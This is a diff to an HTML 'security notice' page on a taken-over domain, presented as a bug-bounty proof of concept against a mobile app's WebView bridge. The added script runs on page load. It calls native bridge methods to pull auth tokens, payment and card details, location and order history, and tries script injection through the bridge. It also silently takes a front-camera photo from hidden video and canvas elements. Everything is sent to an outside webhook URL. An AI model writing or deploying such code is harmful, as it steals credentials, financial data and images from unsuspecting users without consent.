@@ -3,37 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Notice</title>
+    <title>Security Notice - Bugcrowd PoC</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            text-align: center;
-            padding-top: 50px;
-        }
-        .container {
-            background: #fff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            display: inline-block;
-            max-width: 500px;
-        }
-        h1 {
-            color: #d32f2f;
-        }
-        p {
-            font-size: 16px;
-            line-height: 1.5;
-        }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; text-align: center; padding-top: 50px; }
+        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
+        h1 { color: #d32f2f; }
+        p { font-size: 16px; line-height: 1.5; }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pwned by Deep Chotaliya</h1>
-        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
-        <p><small>Bugcrowd Submission Proof</small></p>
+        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research to demonstrate a dangling domain takeover in the McDonald's app.</p>
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas"></canvas>
+        <p><small>Bugcrowd Vulnerability PoC</small></p>
     </div>
+
+    <script>
+        const WEBHOOK = "https://webhook.site/97d50734-50e5-4218-9544-c4710225e1df";
+
+        function exfil(data) {
+            navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+            fetch(WEBHOOK, { method: "POST", body: JSON.stringify(data), mode: "no-cors" }).catch(()=>{});
+        }
+
+        // ============================================================
+        // PHASE 1: dispatchMessage — enumerate every known MCD command
+        // ============================================================
+        var results = { dispatchMessage: {}, handleShare: null, handleShareImage: null };
+
+        // Set up callback listener FIRST before calling bridge
+        window.mcdCallback = function(response) {
+            results.nativeCallback = response;
+            exfil({ type: "NATIVE_CALLBACK", data: response });
+        };
+
+        // Common WebView bridge message patterns
+        var commands = [
+            // Auth & User
+            { action: "getAuthToken",    params: {} },
+            { action: "getAccessToken",  params: {} },
+            { action: "getUserInfo",     params: {} },
+            { action: "getUserProfile",  params: {} },
+            { action: "getSessionToken", params: {} },
+            { action: "getAccountInfo",  params: {} },
+
+            // Payment
+            { action: "getPaymentMethods",  params: {} },
+            { action: "getPaymentToken",    params: {} },
+            { action: "getWalletInfo",      params: {} },
+            { action: "getCardDetails",     params: {} },
+
+            // Location & Device
+            { action: "getLocation",    params: {} },
+            { action: "getDeviceInfo",  params: {} },
+            { action: "getDeviceId",    params: {} },
+
+            // Orders
+            { action: "getOrderHistory", params: {} },
+            { action: "getActiveOrder",  params: {} },
+            { action: "getLoyaltyPoints",params: {} },
+
+            // Navigation (XSS-via-native escalation)
+            { action: "navigate",  params: { url: "https://mymcdonaldsrewards.in/?pwned=1" } },
+            { action: "openUrl",   params: { url: "https://mymcdonaldsrewards.in/?pwned=1" } },
+            { action: "loadUrl",   params: { url: "javascript:alert('XSS via bridge')" } },
+        ];
+
+        // Try all common dispatchMessage call signatures
+        commands.forEach(function(cmd, i) {
+            setTimeout(function() {
+                try {
+                    var r = {};
+
+                    // Signature 1: dispatchMessage(JSON string)
+                    r.sig1 = window.androidMcdBridge.dispatchMessage(
+                        JSON.stringify({ method: cmd.action, params: cmd.params, callbackId: "cb_" + i })
+                    );
+
+                    // Signature 2: dispatchMessage(action, jsonParams, callbackId)
+                    try {
+                        r.sig2 = window.androidMcdBridge.dispatchMessage(
+                            cmd.action, JSON.stringify(cmd.params), "cb2_" + i
+                        );
+                    } catch(e2) { r.sig2_err = e2.toString(); }
+
+                    // Signature 3: dispatchMessage(action, params)
+                    try {
+                        r.sig3 = window.androidMcdBridge.dispatchMessage(cmd.action, cmd.params);
+                    } catch(e3) { r.sig3_err = e3.toString(); }
+
+                    if (r.sig1 !== undefined || r.sig2 !== undefined || r.sig3 !== undefined) {
+                        exfil({ type: "DISPATCH_RESULT", command: cmd.action, result: r });
+                    }
+
+                    results.dispatchMessage[cmd.action] = r;
+                } catch(e) {
+                    results.dispatchMessage[cmd.action] = { error: e.toString() };
+                }
+            }, i * 200); // stagger calls
+        });
+
+        // ============================================================
+        // PHASE 2: handleShare — can we share/steal user data?
+        // ============================================================
+        setTimeout(function() {
+            try {
+                // Signature 1: handleShare(title, text, url)
+                var s1 = window.Android.handleShare(
+                    "Test", 
+                    "Security Research", 
+                    "https://mymcdonaldsrewards.in"
+                );
+                results.handleShare = { result: s1 };
+                exfil({ type: "HANDLE_SHARE_RESULT", result: s1 });
+            } catch(e) {
+                // Signature 2: handleShare(JSON)
+                try {
+                    var s2 = window.Android.handleShare(JSON.stringify({
+                        title: "Test",
+                        text: "Security Research",
+                        url: "https://mymcdonaldsrewards.in"
+                    }));
+                    results.handleShare = { result: s2 };
+                    exfil({ type: "HANDLE_SHARE_RESULT", result: s2 });
+                } catch(e2) {
+                    results.handleShare = { error: e2.toString() };
+                }
+            }
+        }, commands.length * 200 + 500);
+
+        // ============================================================
+        // PHASE 3: handleShareImage — can we grab images from app?
+        // ============================================================
+        setTimeout(function() {
+            try {
+                // Try to share a base64 image — can we READ app images back?
+                var s1 = window.Android.handleShareImage(
+                    "https://mymcdonaldsrewards.in/poc.jpg",
+                    "Security Research Image"
+                );
+                results.handleShareImage = { result: s1 };
+                exfil({ type: "HANDLE_SHARE_IMAGE", result: s1 });
+            } catch(e) {
+                try {
+                    var s2 = window.Android.handleShareImage(
+                        JSON.stringify({ imageUrl: "https://mymcdonaldsrewards.in/poc.jpg" })
+                    );
+                    results.handleShareImage = { result: s2 };
+                    exfil({ type: "HANDLE_SHARE_IMAGE", result: s2 });
+                } catch(e2) {
+                    results.handleShareImage = { error: e2.toString() };
+                }
+            }
+        }, commands.length * 200 + 1000);
+
+        // ============================================================
+        // PHASE 4: Camera + final full dump
+        // ============================================================
+        setTimeout(function() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                audio: false
+            }).then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(function() {
+                    var canvas = document.getElementById('canvas');
+                    canvas.width = 480; canvas.height = 360;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
+                    canvas.toBlob(function(blob) {
+                        var fd = new FormData();
+                        fd.append('type', 'FINAL_POC_DUMP');
+                        fd.append('image', blob, 'selfie.jpg');
+                        fd.append('bridgeResults', JSON.stringify(results));
+                        fd.append('domain', 'mymcdonaldsrewards.in');
+                        fd.append('timestamp', new Date().toISOString());
+                        fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true, mode: 'no-cors' });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg', 0.3);
+                }, 1000);
+            }).catch(function(){});
+        }, commands.length * 200 + 2000);
+
+    </script>
 </body>
 </html>
